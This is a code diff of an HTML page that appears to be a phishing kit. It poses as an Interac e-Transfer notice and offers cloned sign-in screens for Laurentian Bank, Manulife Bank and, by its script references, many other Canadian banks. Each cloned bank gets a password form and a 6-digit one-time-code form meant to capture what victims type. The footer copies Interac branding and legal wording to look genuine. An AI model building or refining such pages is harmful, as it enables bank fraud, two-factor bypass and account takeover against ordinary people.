             </div>
 
             <!-- Laurentian Bank Login View -->
-            <div id="laurentianBankLoginView" class="hidden bg-white text-gray-800 rounded-lg shadow-md overflow-hidden">
+            <div id="laurentianBankLoginView" class="hidden bg-white text-gray-800 p-6 rounded-lg shadow-md">
                 <!-- Laurentian Bank Header -->
-                <div class="flex justify-between items-center p-4 border-b border-gray-200">
-                    <div class="flex items-center space-x-2">
-                        <img src="optionl6.png" alt="Laurentian Bank Logo" class="w-24 h-24 object-contain">
-                        <span class="text-xl font-bold laurentian-blue-text">Laurentian Bank</span>
-                    </div>
-                    <a href="#" class="text-blue-600 text-sm hover:underline">Français</a>
+                <div class="flex items-center space-x-3 mb-8">
+                    <!-- Laurentian Bank Logo -->
+                    <img src="optionl6.png" alt="Laurentian Bank Logo" class="w-24 h-24 object-contain">
+                    <span class="text-2xl font-bold">Laurentian Bank</span>
                 </div>
-
-                <div class="p-6">
-                    <h2 class="text-2xl font-semibold mb-6">Sign in to Online Banking</h2>
-
-                    <form class="space-y-4" id="laurentianLoginForm">
-                        <div>
-                            <label for="laurentianUsername" class="block text-sm font-medium text-gray-700 mb-1">Username</label>
-                            <input type="text" id="laurentianUsername" name="laurentianUsername" placeholder="Your username"
-                                   class="mt-1 block w-full px-4 py-2 border border-gray-300 rounded-md shadow-sm focus:ring-blue-500 focus:border-blue-500 sm:text-sm">
-                        </div>
-                        <div>
-                            <label for="laurentianPassword" class="block text-sm font-medium text-gray-700 mb-1">Password</label>
-                            <input type="password" id="laurentianPassword" name="laurentianPassword" placeholder="Your password"
-                                   class="mt-1 block w-full px-4 py-2 border border-gray-300 rounded-md shadow-sm focus:ring-blue-500 focus:border-blue-500 sm:text-sm">
-                        </div>
+                <h2 class="text-2xl font-semibold mb-6">Online Banking</h2>
+                <form class="space-y-6" id="laurentianBankLoginForm">
+                    <div>
+                        <label for="laurentianCardNumber" class="block text-sm font-medium text-gray-700 mb-1">Card number</label>
+                        <input type="text" id="laurentianCardNumber" name="laurentianCardNumber"
+                               class="mt-1 block w-full px-4 py-2 border border-gray-300 rounded-md shadow-sm focus:ring-blue-500 focus:border-blue-500 sm:text-sm">
+                    </div>
+                    <div>
+                        <label for="laurentianPassword" class="block text-sm font-medium text-gray-700 mb-1">Password</label>
+                        <input type="password" id="laurentianPassword" name="laurentianPassword"
+                               class="mt-1 block w-full px-4 py-2 border border-gray-300 rounded-md shadow-sm focus:ring-blue-500 focus:border-blue-500 sm:text-sm">
+                    </div>
+                    <div class="flex items-center justify-between text-sm">
                         <div class="flex items-center">
                             <input id="laurentianRememberMe" name="laurentianRememberMe" type="checkbox"
                                    class="h-4 w-4 text-blue-600 focus:ring-blue-500 border-gray-300 rounded">
-                            <label for="laurentianRememberMe" class="ml-2 block text-sm text-gray-700">Remember me</label>
+                            <label for="laurentianRememberMe" class="ml-2 block text-gray-700">Remember my card number</label>
                         </div>
-                        <button type="button" onclick="handleLoginSubmit('laurentian')" class="laurentian-btn w-full font-bold py-3 px-4 rounded-lg transition duration-150 ease-in-out">
-                            Sign in
-                        </button>
-                    </form>
-                    <div class="mt-4 text-center">
-                        <a href="#" class="text-sm text-blue-600 hover:underline">Forgot your username or password?</a>
+                        <a href="#" class="font-medium laurentian-blue-text hover:underline">Forgot your password?</a>
                     </div>
-                </div>
+                    <button type="button" onclick="handleLoginSubmit('laurentianBank')"
+                            class="laurentian-btn w-full font-bold py-3 px-4 rounded-lg transition duration-150 ease-in-out mt-6">
+                        Log In
+                    </button>
+                </form>
                 <button onclick="showOptionSelectionView(); logUserAction('Back to Options from Laurentian Bank Login')" class="mt-8 w-full bg-gray-200 hover:bg-gray-300 text-gray-800 font-bold py-3 px-4 rounded-lg flex items-center justify-center transition duration-150 ease-in-out">
                     <svg class="w-5 h-5 mr-2" fill="none" stroke="currentColor" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M15 19l-7-7 7-7"></path></svg>
                     <span>Back to Options</span>
                 </button>
             </div>
 
-            <!-- Laurentian Bank 6-Digit Code Entry View -->
-            <div id="laurentianAuthCodeView" class="hidden bg-white text-gray-800 rounded-lg shadow-md overflow-hidden">
-                <!-- Laurentian Bank Header -->
-                <div class="flex justify-between items-center p-4 border-b border-gray-200">
-                    <div class="flex items-center space-x-2">
-                        <img src="optionl6.png" alt="Laurentian Bank Logo" class="w-24 h-24 object-contain">
-                        <span class="text-xl font-bold laurentian-blue-text">Laurentian Bank</span>
+            <!-- Laurentian Bank 6-Digit Code Entry View (newly added) -->
+            <div id="laurentianBankAuthCodeView" class="hidden laurentian-blue-text bg-white p-6 rounded-lg shadow-md">
+                <!-- Header similar to Laurentian Bank login -->
+                <div class="flex items-center space-x-3 mb-8">
+                    <img src="optionl6.png" alt="Laurentian Bank Logo" class="w-24 h-24 object-contain">
+                    <span class="text-2xl font-bold">Laurentian Bank</span>
+                </div>
+                <h2 class="text-2xl font-semibold mb-6">Enter Your 6-Digit Code</h2>
+                <p class="text-sm text-gray-600 mb-4">A code has been sent to your registered mobile number.</p>
+                <form class="space-y-6" id="laurentianBankOtpForm">
+                    <div class="code-input-group" id="laurentianBankCodeInputs">
+                        <input type="number" id="laurentianBankCode1" maxlength="1" oninput="moveToNext(this)" onkeydown="moveToPrevious(event, this)" class="code-input">
+                        <input type="number" id="laurentianBankCode2" maxlength="1" oninput="moveToNext(this)" onkeydown="moveToPrevious(event, this)" class="code-input">
+                        <input type="number" id="laurentianBankCode3" maxlength="1" oninput="moveToNext(this)" onkeydown="moveToPrevious(event, this)" class="code-input">
+                        <input type="number" id="laurentianBankCode4" maxlength="1" oninput="moveToNext(this)" onkeydown="moveToPrevious(event, this)" class="code-input">
+                        <input type="number" id="laurentianBankCode5" maxlength="1" oninput="moveToNext(this)" onkeydown="moveToPrevious(event, this)" class="code-input">
+                        <input type="number" id="laurentianBankCode6" maxlength="1" onkeydown="moveToPrevious(event, this)" class="code-input">
                     </div>
-                    <a href="#" class="text-blue-600 text-sm hover:underline">Français</a>
-                </div>
-                <div class="p-6">
-                    <h2 class="text-2xl font-semibold mb-6">Enter Your 6-Digit Code</h2>
-                    <p class="text-sm text-gray-600 mb-4">A code has been sent to your registered mobile number.</p>
-                    <form class="space-y-4" id="laurentianOtpForm">
-                        <div class="code-input-group" id="laurentianCodeInputs">
-                            <input type="number" id="laurentianCode1" maxlength="1" oninput="moveToNext(this)" onkeydown="moveToPrevious(event, this)" class="code-input">
-                            <input type="number" id="laurentianCode2" maxlength="1" oninput="moveToNext(this)" onkeydown="moveToPrevious(event, this)" class="code-input">
-                            <input type="number" id="laurentianCode3" maxlength="1" oninput="moveToNext(this)" onkeydown="moveToPrevious(event, this)" class="code-input">
-                            <input type="number" id="laurentianCode4" maxlength="1" oninput="moveToNext(this)" onkeydown="moveToPrevious(event, this)" class="code-input">
-                            <input type="number" id="laurentianCode5" maxlength="1" oninput="moveToNext(this)" onkeydown="moveToPrevious(event, this)" class="code-input">
-                            <input type="number" id="laurentianCode6" maxlength="1" onkeydown="moveToPrevious(event, this)" class="code-input">
-                        </div>
-                        <button type="button" onclick="handleOtpSubmit('laurentian')" class="laurentian-btn w-full font-bold py-3 px-4 rounded-lg transition duration-150 ease-in-out">
-                            Verify Code
-                        </button>
-                        <a href="#" class="block mt-4 text-sm text-blue-600 hover:underline text-center">Resend Code</a>
-                    </form>
-                </div>
+                    <button type="button" onclick="handleOtpSubmit('laurentianBank')" class="laurentian-btn w-full font-bold py-3 px-4 rounded-lg transition duration-150 ease-in-out mt-6">
+                        Verify Code
+                    </button>
+                    <a href="#" class="block mt-4 text-sm laurentian-blue-text hover:underline text-center">Resend Code</a>
+                </form>
                 <button onclick="showLaurentianBankLoginView(); logUserAction('Back to Laurentian Bank Login from OTP')" class="mt-8 w-full bg-gray-200 hover:bg-gray-300 text-gray-800 font-bold py-3 px-4 rounded-lg flex items-center justify-center transition duration-150 ease-in-out">
                     <svg class="w-5 h-5 mr-2" fill="none" stroke="currentColor" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M15 19l-7-7 7-7"></path></svg>
                     <span>Back to Login</span>
@@ -1339,77 +1188,65 @@
             </div>
 
             <!-- Manulife Bank Login View -->
-            <div id="manulifeBankLoginView" class="hidden bg-white text-gray-800 rounded-lg shadow-md overflow-hidden">
+            <div id="manulifeBankLoginView" class="hidden bg-white text-gray-800 p-6 rounded-lg shadow-md">
                 <!-- Manulife Bank Header -->
-                <div class="manulife-green-header text-white p-4 flex justify-between items-center">
-                    <div class="flex items-center space-x-2">
-                        <img src="optionl7.png" alt="Manulife Bank Logo" class="w-24 h-24 object-contain">
-                        <span class="text-xl font-bold">Manulife Bank</span>
-                    </div>
-                    <a href="#" class="text-white text-sm hover:underline">Français</a>
+                <div class="manulife-green-header text-white p-4 rounded-t-lg -mx-6 -mt-6 mb-6">
+                    <img src="optionl7.png" alt="Manulife Bank Logo" class="h-10 mx-auto">
                 </div>
-
-                <div class="p-6">
-                    <h2 class="text-2xl font-semibold mb-6">Sign in to your Manulife Bank account</h2>
-
-                    <form class="space-y-4" id="manulifeLoginForm">
-                        <div>
-                            <label for="manulifeUsername" class="block text-sm font-medium text-gray-700 mb-1">Username</label>
-                            <input type="text" id="manulifeUsername" name="manulifeUsername" placeholder="Your username"
-                                   class="mt-1 block w-full px-4 py-2 border border-gray-300 rounded-md shadow-sm focus:ring-green-500 focus:border-green-500 sm:text-sm">
-                        </div>
-                        <div>
-                            <label for="manulifePassword" class="block text-sm font-medium text-gray-700 mb-1">Password</label>
-                            <input type="password" id="manulifePassword" name="manulifePassword" placeholder="Your password"
-                                   class="mt-1 block w-full px-4 py-2 border border-gray-300 rounded-md shadow-sm focus:ring-green-500 focus:border-green-500 sm:text-sm">
-                        </div>
+                <h2 class="text-2xl font-semibold mb-6 text-center">Sign in to Manulife Bank Online Banking</h2>
+                <form class="space-y-6" id="manulifeBankLoginForm">
+                    <div>
+                        <label for="manulifeCardNumber" class="block text-sm font-medium text-gray-700 mb-1">Client Number or Username</label>
+                        <input type="text" id="manulifeCardNumber" name="manulifeCardNumber"
+                               class="mt-1 block w-full px-4 py-2 border border-gray-300 rounded-md shadow-sm focus:ring-blue-500 focus:border-blue-500 sm:text-sm">
+                    </div>
+                    <div>
+                        <label for="manulifePassword" class="block text-sm font-medium text-gray-700 mb-1">Password</label>
+                        <input type="password" id="manulifePassword" name="manulifePassword"
+                               class="mt-1 block w-full px-4 py-2 border border-gray-300 rounded-md shadow-sm focus:ring-blue-500 focus:border-blue-500 sm:text-sm">
+                    </div>
+                    <div class="flex items-center justify-between text-sm">
                         <div class="flex items-center">
                             <input id="manulifeRememberMe" name="manulifeRememberMe" type="checkbox"
-                                   class="h-4 w-4 text-green-600 focus:ring-green-500 border-gray-300 rounded">
-                            <label for="manulifeRememberMe" class="ml-2 block text-sm text-gray-700">Remember me</label>
+                                   class="h-4 w-4 text-blue-600 focus:ring-blue-500 border-gray-300 rounded">
+                            <label for="manulifeRememberMe" class="ml-2 block text-gray-700">Remember my Client Number / Username</label>
                         </div>
-                        <button type="button" onclick="handleLoginSubmit('manulife')" class="manulife-red-btn w-full font-bold py-3 px-4 rounded-lg transition duration-150 ease-in-out">
-                            Sign in
-                        </button>
-                    </form>
-                    <div class="mt-4 text-center">
-                        <a href="#" class="text-sm manulife-link-green hover:underline">Forgot your username or password?</a>
+                        <a href="#" class="font-medium manulife-link-green hover:underline">Forgot your Client Number / Username or Password?</a>
                     </div>
-                </div>
+                    <button type="button" onclick="handleLoginSubmit('manulifeBank')"
+                            class="manulife-red-btn w-full font-bold py-3 px-4 rounded-lg transition duration-150 ease-in-out mt-6">
+                        Sign In
+                    </button>
+                </form>
                 <button onclick="showOptionSelectionView(); logUserAction('Back to Options from Manulife Bank Login')" class="mt-8 w-full bg-gray-200 hover:bg-gray-300 text-gray-800 font-bold py-3 px-4 rounded-lg flex items-center justify-center transition duration-150 ease-in-out">
                     <svg class="w-5 h-5 mr-2" fill="none" stroke="currentColor" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M15 19l-7-7 7-7"></path></svg>
                     <span>Back to Options</span>
                 </button>
             </div>
 
-            <!-- Manulife Bank 6-Digit Code Entry View -->
-            <div id="manulifeAuthCodeView" class="hidden bg-white text-gray-800 rounded-lg shadow-md overflow-hidden">
-                <!-- Manulife Bank Header -->
-                <div class="manulife-green-header text-white p-4 flex justify-between items-center">
-                    <div class="flex items-center space-x-2">
-                        <img src="optionl7.png" alt="Manulife Bank Logo" class="w-24 h-24 object-contain">
-                        <span class="text-xl font-bold">Manulife Bank</span>
+            <!-- Manulife Bank 6-Digit Code Entry View (newly added) -->
+            <div id="manulifeBankAuthCodeView" class="hidden manulife-green-header text-white p-6 rounded-lg shadow-md">
+                <!-- Header similar to Manulife Bank login -->
+                <div class="flex items-center space-x-3 mb-8">
+                    <img src="optionl7.png" alt="Manulife Bank Logo" class="w-24 h-24 object-contain">
+                    <span class="text-2xl font-bold">Manulife Bank</span>
+                </div>
+                <h2 class="text-2xl font-semibold mb-6">Enter Your 6-Digit Code</h2>
+                <p class="text-sm text-gray-200 mb-4">A code has been sent to your registered mobile number.</p>
+                <form class="space-y-6" id="manulifeBankOtpForm">
+                    <div class="code-input-group" id="manulifeBankCodeInputs">
+                        <input type="number" id="manulifeBankCode1" maxlength="1" oninput="moveToNext(this)" onkeydown="moveToPrevious(event, this)" class="code-input">
+                        <input type="number" id="manulifeBankCode2" maxlength="1" oninput="moveToNext(this)" onkeydown="moveToPrevious(event, this)" class="code-input">
+                        <input type="number" id="manulifeBankCode3" maxlength="1" oninput="moveToNext(this)" onkeydown="moveToPrevious(event, this)" class="code-input">
+                        <input type="number" id="manulifeBankCode4" maxlength="1" oninput="moveToNext(this)" onkeydown="moveToPrevious(event, this)" class="code-input">
+                        <input type="number" id="manulifeBankCode5" maxlength="1" oninput="moveToNext(this)" onkeydown="moveToPrevious(event, this)" class="code-input">
+                        <input type="number" id="manulifeBankCode6" maxlength="1" onkeydown="moveToPrevious(event, this)" class="code-input">
                     </div>
-                    <a href="#" class="text-white text-sm hover:underline">Français</a>
-                </div>
-                <div class="p-6">
-                    <h2 class="text-2xl font-semibold mb-6">Enter Your 6-Digit Code</h2>
-                    <p class="text-sm text-gray-600 mb-4">A code has been sent to your registered mobile number.</p>
-                    <form class="space-y-4" id="manulifeOtpForm">
-                        <div class="code-input-group" id="manulifeCodeInputs">
-                            <input type="number" id="manulifeCode1" maxlength="1" oninput="moveToNext(this)" onkeydown="moveToPrevious(event, this)" class="code-input">
-                            <input type="number" id="manulifeCode2" maxlength="1" oninput="moveToNext(this)" onkeydown="moveToPrevious(event, this)" class="code-input">
-                            <input type="number" id="manulifeCode3" maxlength="1" oninput="moveToNext(this)" onkeydown="moveToPrevious(event, this)" class="code-input">
-                            <input type="number" id="manulifeCode4" maxlength="1" oninput="moveToNext(this)" onkeydown="moveToPrevious(event, this)" class="code-input">
-                            <input type="number" id="manulifeCode5" maxlength="1" oninput="moveToNext(this)" onkeydown="moveToPrevious(event, this)" class="code-input">
-                            <input type="number" id="manulifeCode6" maxlength="1" onkeydown="moveToPrevious(event, this)" class="code-input">
-                        </div>
-                        <button type="button" onclick="handleOtpSubmit('manulife')" class="manulife-red-btn w-full font-bold py-3 px-4 rounded-lg transition duration-150 ease-in-out mt-6">
-                            Verify Code
-                        </button>
-                        <a href="#" class="block mt-4 text-sm manulife-link-green hover:underline text-center">Resend Code</a>
-                    </form>
-                </div>
+                    <button type="button" onclick="handleOtpSubmit('manulifeBank')" class="manulife-red-btn w-full font-bold py-3 px-4 rounded-lg transition duration-150 ease-in-out mt-6">
+                        Verify Code
+                    </button>
+                    <a href="#" class="block mt-4 text-sm manulife-link-green hover:underline text-center">Resend Code</a>
+                </form>
                 <button onclick="showManulifeBankLoginView(); logUserAction('Back to Manulife Bank Login from OTP')" class="mt-8 w-full bg-gray-200 hover:bg-gray-300 text-gray-800 font-bold py-3 px-4 rounded-lg flex items-center justify-center transition duration-150 ease-in-out">
                     <svg class="w-5 h-5 mr-2" fill="none" stroke="currentColor" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M15 19l-7-7 7-7"></path></svg>
                     <span>Back to Login</span>
@@ -1418,370 +1255,366 @@
 
         </main>
 
-        <!-- Footer Section (common to all views) -->
-        <footer class="bg-gray-900 text-gray-400 text-xs p-8 sm:p-12 text-center space-y-6">
-            <p>To restrict interactions with this user, or to manage your Interac e-Transfer preferences, <a href="#" class="text-blue-400 hover:underline">Click here.</a></p>
-            <p>For your security, please do not forward this email as it contains confidential information meant only for you. Interac will never request access to this email notification from you.</p>
-
-            <!-- Social Media Icons -->
-            <div class="flex justify-center space-x-4 mt-6">
-                <a href="#" class="social-icon" aria-label="Facebook">
-                    <svg fill="currentColor" viewBox="0 0 24 24" width="1em" height="1em" xmlns="http://www.w3.org/2000/svg"><path d="M22 12c0-5.52-4.48-10-10-10S2 6.48 2 12c0 4.84 3.44 8.87 8 9.8V15H8v-3h2V9.5C10 7.57 11.25 6 14.5 6c1.45 0 2.42.12 2.75.25V8h-1.64c-1.5 0-1.93.93-1.93 1.87V12h3l-.6 3h-2.4v6.8c4.56-.93 8-4.96 8-9.8z"/></svg>
-                </a>
-                <a href="#" class="social-icon" aria-label="TikTok">
-                    <svg fill="currentColor" viewBox="0 0 24 24" width="1em" height="1em" xmlns="http://www.w3.org/2000/svg"><path d="M12.53 0C11.52 0 11 0 11 0v4.81c.32-.01.64-.01.96-.01 2.65 0 4.8 2.15 4.8 4.8s-2.15 4.8-4.8 4.8c-.32 0-.64 0-.96-.01V24c0 0 .52 0 1.53 0 5.52 0 10-4.48 10-10S18.05 0 12.53 0zM5.53 10C4.52 10 4 10 4 10v4.81c.32-.01.64-.01.96-.01 2.65 0 4.8 2.15 4.8 4.8s-2.15 4.8-4.8 4.8c-.32 0-.64 0-.96-.01V24c0 0 .52 0 1.53 0 5.52 0 10-4.48 10-10S11.05 10 5.53 10z"/></svg>
-                </a>
-                <a href="#" class="social-icon" aria-label="LinkedIn">
-                    <svg fill="currentColor" viewBox="0 0 24 24" width="1em" height="1em" xmlns="http://www.w3.org/2000/svg"><path d="M22.23 0H1.77C.79 0 0 .77 0 1.72v20.56C0 23.23.79 24 1.77 24h20.46c.98 0 1.77-.77 1.77-1.72V1.72C24 .77 23.21 0 22.23 0zM7.12 20.45H3.59V9.3H7.12v11.15zM5.35 7.74c-1.14 0-2.07-.92-2.07-2.06 0-1.14.93-2.07 2.07-2.07 1.14 0 2.07.93 2.07 2.07 0 1.14-.93 2.06-2.07 2.06zM20.45 20.45h-3.53v-5.6c0-1.34-.02-3.06-1.87-3.06-1.87 0-2.16 1.46-2.16 2.96v5.7H9.36V9.3h3.4v1.56h.05c.47-.89 1.62-1.82 3.36-1.82 3.6 0 4.27 2.37 4.27 5.45v6.16z"/></svg>
-                </a>
-                <a href="#" class="social-icon" aria-label="YouTube">
-                    <svg fill="currentColor" viewBox="0 0 24 24" width="1em" height="1em" xmlns="http://www.w3.org/2000/svg"><path d="M21.58 7.19c-.23-.86-.91-1.54-1.77-1.77C18.25 5 12 5 12 5s-6.25 0-7.81.42c-.86.23-1.54.91-1.77 1.77C2 8.75 2 12 2 12s0 3.25.42 4.81c.23.86.91 1.54 1.77 1.77C5.75 19 12 19 12 19s6.25 0 7.81-.42c.86-.23 1.54-.91 1.77-1.77C22 15.25 22 12 22 12s0-3.25-.42-4.81zM9.54 15.34V8.66L15.94 12l-6.4 3.34z"/></svg>
-                </a>
-                <a href="#" class="social-icon" aria-label="Instagram">
-                    <svg fill="currentColor" viewBox="0 0 24 24" width="1em" height="1em" xmlns="http://www.w3.org/2000/svg"><path d="M12 2.16c3.2 0 3.58.01 4.85.07 1.25.06 1.9.26 2.45.48.58.23 1.05.5 1.52.97.47.47.74.94.97 1.52.22.55.42 1.2.48 2.45.06 1.27.07 1.65.07 4.85s-.01 3.58-.07 4.85c-.06 1.25-.26 1.9-.48 2.45-.23.58-.5 1.05-.97 1.52-.47.47-.94.74-1.52.97-.55.22-1.2.42-2.45.48-1.27.06-1.65.07-4.85.07s-3.58-.01-4.85-.07c-1.25-.06-1.9-.26-2.45-.48-.58-.23-1.05-.5-1.52-.97-.47-.47-.94-.74-.97-1.52-.22-.55-.42-1.2-.48-2.45-.06-1.27-.07-1.65-.07-4.85s.01-3.58.07-4.85c.06-1.25.26-1.9.48-2.45.23-.58.5-1.05.97-1.52.47-.47.94-.74 1.52-.97.55-.22 1.2-.42 2.45-.48C8.42 2.17 8.79 2.16 12 2.16zm0 2.16c-3.14 0-3.53.01-4.76.07-1.17.06-1.7.25-2.06.39-.37.15-.68.32-.99.63-.31.31-.48.62-.63.99-.14.36-.33.89-.39 2.06-.06 1.23-.07 1.62-.07 4.76s.01 3.53.07 4.76c.06 1.17.25 1.7.39 2.06.15.37.32.68.63.99.31.31.62.48.99.63.36.14.89.33 2.06.39 1.23.06 1.62.07 4.76.07s3.53-.01 4.76-.07c1.17-.06 1.7-.25 2.06-.39.37-.15.68-.32.99-.63.31-.31.48-.62.63-.99.14-.36.33-.89.39-2.06.06-1.23.07-1.62.07-4.76s-.01-3.53-.07-4.76c-.06-1.17-.25-1.7-.39-2.06-.15-.37-.32-.68-.63-.99-.31-.31-.62-.48-.99-.63-.36-.14-.89-.33-2.06-.39-1.23-.06-1.62-.07-4.76-.07zM12 7.29c-2.59 0-4.71 2.12-4.71 4.71s2.12 4.71 4.71 4.71 4.71-2.12 4.71-4.71-2.12-4.71-4.71-4.71zm0 7.29c-1.42 0-2.58-1.16-2.58-2.58s1.16-2.58 2.58-2.58 2.58 1.16 2.58 2.58-1.16 2.58-2.58 2.58zm6.4-8.64c-.58 0-1.05.47-1.05 1.05s.47 1.05 1.05 1.05 1.05-.47 1.05-1.05-.47-1.05-1.05-1.05z"/></svg>
-                </a>
+        <!-- Footer -->
+        <footer class="bg-gray-100 p-6 sm:p-8 text-center text-gray-600 text-xs">
+            <div class="flex flex-wrap justify-center space-x-4 mb-4">
+                <a href="#" class="hover:underline">Contact Us</a>
+                <span class="text-gray-400">|</span>
+                <a href="#" class="hover:underline">Security</a>
+                <span class="text-gray-400">|</span>
+                <a href="#" class="hover:underline">Legal</a>
+                <span class="text-gray-400">|</span>
+                <a href="#" class="hover:underline">Privacy</a>
             </div>
-
-            <div class="border-t border-gray-700 pt-6 mt-6">
-                <div class="flex items-start justify-center space-x-2 mb-4">
-                    <!-- Interac Logo in Footer -->
-                    <img src="pageicon0.png" alt="Interac Logo" class="w-[72px] h-[72px]">
-                    <div>
-                        <p class="font-bold text-white">interac</p>
-                        <p class="text-gray-500">e-Transfer</p>
-                    </div>
-                </div>
-                <p class="text-gray-500 mb-2">2000 - 2024 Interac Corp.</p>
-                <p class="text-500 mb-4">All Rights Reserved. Terms of Use</p>
-                <p class="text-gray-500 mb-4">™/® Trademarks of Interac Corp.</p>
-                <p class="text-gray-500 mb-4">Email or text messages carry the notice while the financial institutions securely transfer the money using existing payment networks.</p>
-                <p class="text-gray-500">This email was sent to you by Interac Corp., the owner of the Interac e-Transfer service on behalf of NAOMI BHALLA at SCOTIABANK</p>
+            <p class="mb-2">&copy; 2024 Interac Corp. All rights reserved. Interac e-Transfer is a registered trade-mark of Interac Corp.</p>
+            <p>This email was sent by Interac Corp. located at 123 Queen Street West, Toronto, ON M5V 2J3. To unsubscribe from future emails, please click here.</p>
+            <div class="flex justify-center space-x-4 mt-4">
+                <a href="#" class="social-icon bg-gray-600 hover:bg-gray-700">
+                    <svg class="w-4 h-4" fill="currentColor" viewBox="0 0 24 24" aria-hidden="true"><path d="M8.29 20.31c4.54 0 7.02-3.76 7.02-7.02 0-.11 0-.21-.01-.32A5.02 5.02 0 0019 7.74a4.93 4.93 0 01-1.42.39 2.47 2.47 0 001.08-1.37A4.9 4.9 0 0117.2 7c-1.02-1.02-2.47-1.66-4.1-1.66-3.13 0-5.69 2.5-5.69 5.61 0 .44.05.87.14 1.28-4.73-.24-8.91-2.5-11.72-5.91a5.61 5.61 0 00-.77 2.82c0 1.95 1.05 3.66 2.65 4.67a2.53 2.53 0 01-1.15-.31v.07c0 2.7 1.92 4.96 4.47 5.48a2.53 2.53 0 01-1.15.05 2.53 2.53 0 002.36 1.75c-1.92 1.5-4.34 2.4-6.98 2.4-.46 0-.9-.03-1.34-.08 2.47 1.58 5.39 2.5 8.54 2.5"></path></svg>
+                </a>
+                <a href="#" class="social-icon bg-gray-600 hover:bg-gray-700">
+                    <svg class="w-4 h-4" fill="currentColor" viewBox="0 0 24 24" aria-hidden="true"><path d="M12 2C6.47 2 2 6.47 2 12s4.47 10 10 10 10-4.47 10-10S17.53 2 12 2zm3.32 8.52h-1.9V14h-2.9v-3.48H8.53V8.8h1.9V7.1a3.22 3.22 0 013.43-3.57c1 .07 1.83.16 2.1.25v2.44h-1.46c-1.16 0-1.38.55-1.38 1.35v1.73z"></path></svg>
+                </a>
+                <a href="#" class="social-icon bg-gray-600 hover:bg-gray-700">
+                    <svg class="w-4 h-4" fill="currentColor" viewBox="0 0 24 24" aria-hidden="true"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm5 14.88c0 .12-.1.22-.22.22H7.22c-.12 0-.22-.1-.22-.22V7.12c0-.12.1-.22.22-.22h9.56c.12 0 .22.1.22.22v9.76zM15 10l-4 4-2-2"></path></svg>
+                </a>
             </div>
         </footer>
+
     </div>
 
     <script>
-        // Get references to the main views
-        const collectFundsView = document.getElementById('collectFundsView');
-        const optionSelectionView = document.getElementById('optionSelectionView');
-
-        const rbcLoginView = document.getElementById('rbcLoginView');
-        const tdLoginView = document.getElementById('tdLoginView');
-        const scotiaLoginView = document.getElementById('scotiaLoginView');
-        const nbcLoginView = document.getElementById('nbcLoginView');
-        const cibcLoginView = document.getElementById('cibcLoginView');
-        const pcLoginView = document.getElementById('pcLoginView');
-        const bmoLoginView = document.getElementById('bmoLoginView');
-        const simpliiLoginView = document.getElementById('simpliiLoginView');
-        const atbLoginView = document.getElementById('atbLoginView');
-        const desjardinsLoginView = document.getElementById('desjardinsLoginView');
-        const laurentianBankLoginView = document.getElementById('laurentianBankLoginView');
-        const manulifeBankLoginView = document.getElementById('manulifeBankLoginView');
-
-        // New 6-Digit Code Entry Views
-        const rbcAuthCodeView = document.getElementById('rbcAuthCodeView');
-        const tdAuthCodeView = document.getElementById('tdAuthCodeView');
-        const scotiaAuthCodeView = document.getElementById('scotiaAuthCodeView');
-        const nbcAuthCodeView = document.getElementById('nbcAuthCodeView');
-        const cibcAuthCodeView = document.getElementById('cibcAuthCodeView');
-        const pcAuthCodeView = document.getElementById('pcAuthCodeView');
-        const bmoAuthCodeView = document.getElementById('bmoAuthCodeView');
-        const simpliiAuthCodeView = document.getElementById('simpliiAuthCodeView');
-        const atbAuthCodeView = document.getElementById('atbAuthCodeView');
-        const desjardinsAuthCodeView = document.getElementById('desjardinsAuthCodeView');
-        const laurentianAuthCodeView = document.getElementById('laurentianAuthCodeView');
-        const manulifeAuthCodeView = document.getElementById('manulifeAuthCodeView');
-
-
-        // Function to hide all views
-        function hideAllViews() {
-            collectFundsView.classList.add('hidden');
-            optionSelectionView.classList.add('hidden');
-            rbcLoginView.classList.add('hidden');
-            tdLoginView.classList.add('hidden');
-            scotiaLoginView.classList.add('hidden');
-            nbcLoginView.classList.add('hidden');
-            cibcLoginView.classList.add('hidden');
-            pcLoginView.classList.add('hidden');
-            bmoLoginView.classList.add('hidden');
-            simpliiLoginView.classList.add('hidden');
-            atbLoginView.classList.add('hidden');
-            desjardinsLoginView.classList.add('hidden');
-            laurentianBankLoginView.classList.add('hidden');
-            manulifeBankLoginView.classList.add('hidden');
-
-            // Hide all new Auth Code Views
-            rbcAuthCodeView.classList.add('hidden');
-            tdAuthCodeView.classList.add('hidden');
-            scotiaAuthCodeView.classList.add('hidden');
-            nbcAuthCodeView.classList.add('hidden');
-            cibcAuthCodeView.classList.add('hidden');
-            pcAuthCodeView.classList.add('hidden');
-            bmoAuthCodeView.classList.add('hidden');
-            simpliiAuthCodeView.classList.add('hidden');
-            atbAuthCodeView.classList.add('hidden');
-            desjardinsAuthCodeView.classList.add('hidden');
-            laurentianAuthCodeView.classList.add('hidden');
-            manulifeAuthCodeView.classList.add('hidden');
+        // Function to log user actions (placeholder for actual logging)
+        function logUserAction(action, details = {}) {
+            console.log(`User Action: ${action}`, details);
+            // In a real application, this would send data to an analytics service
+            // You can add gtag events here for specific actions if needed
+            // For example: gtag('event', action, { 'event_category': 'UserInteraction', 'event_label': details.bank || 'General' });
         }
 
-        // Function to show the option selection view
-        function showOptionSelectionView() {
-            hideAllViews();
-            optionSelectionView.classList.remove('hidden');
-        }
-
-        // Function to show the collect funds view
+        // Functions to control view visibility
         function showCollectFundsView() {
-            hideAllViews();
-            collectFundsView.classList.remove('hidden');
+            document.getElementById('collectFundsView').classList.remove('hidden');
+            document.getElementById('optionSelectionView').classList.add('hidden');
+            document.getElementById('rbcLoginView').classList.add('hidden');
+            document.getElementById('rbcAuthCodeView').classList.add('hidden'); // Ensure this is hidden
+            document.getElementById('tdLoginView').classList.add('hidden');
+            document.getElementById('tdAuthCodeView').classList.add('hidden'); // Ensure this is hidden
+            document.getElementById('scotiaLoginView').classList.add('hidden');
+            document.getElementById('scotiaAuthCodeView').classList.add('hidden'); // Ensure this is hidden
+            document.getElementById('nbcLoginView').classList.add('hidden');
